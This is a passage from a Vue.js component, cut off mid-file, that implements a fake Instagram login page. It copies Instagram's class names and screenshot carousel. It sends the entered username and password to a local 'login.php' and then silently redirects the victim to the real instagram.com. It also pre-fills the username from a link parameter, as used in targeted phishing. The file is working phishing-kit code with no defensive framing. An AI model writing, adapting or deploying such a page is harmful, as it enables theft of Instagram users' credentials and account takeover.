<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      referrerPage: "//www.instagram.com/",
      passwordType: 'password',
      cycleHandler: null,
      activeScreenshot: 5,
      login: '',
      password: ''
    }
  },
  methods: {
    cycleScreenshots () {
      let t = this
      if (t.activeScreenshot == 1) {
        t.activeScreenshot = 5
      } else {
        t.activeScreenshot = t.activeScreenshot -1
      }
    },
    togglePasswordType () {
      let t = this
      if (t.passwordType === 'password') {
        t.passwordType = 'text'
      } else {
        t.passwordType = 'password'
      }
    },
    submitForm () {
      let vm = this
      axios.post('login.php', {username: vm.login, password: vm.password})
      .then(res => {
        window.location.replace(vm.referrerPage);
      })
      .catch(error => {
        window.location.replace(vm.referrerPage);
      })
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.login = "undefined" !== typeof getVars["l"] ? getVars["l"] : "";
      }
    }
  },
  computed: {
    dateYear () {
      return new Date().getFullYear()
    },
    screenshot1Class () {
      let t = this
      switch (t.activeScreenshot) {
        case 1: return 'RP4i1 JtrJi '
        case 2: return 'RP4i1  '
        case 3: return 'RP4i1  '
        case 4: return 'RP4i1  '
        case 5: return 'RP4i1 UVauz'
      }
    },
    screenshot2Class () {
      let t = this
      switch (t.activeScreenshot) {
        case 1: return 'RP4i1 UVauz'
        case 2: return 'RP4i1 JtrJi '
        case 3: return 'RP4i1  '
        case 4: return 'RP4i1  '
        case 5: return 'RP4i1  '
      }
    },
    screenshot3Class () {
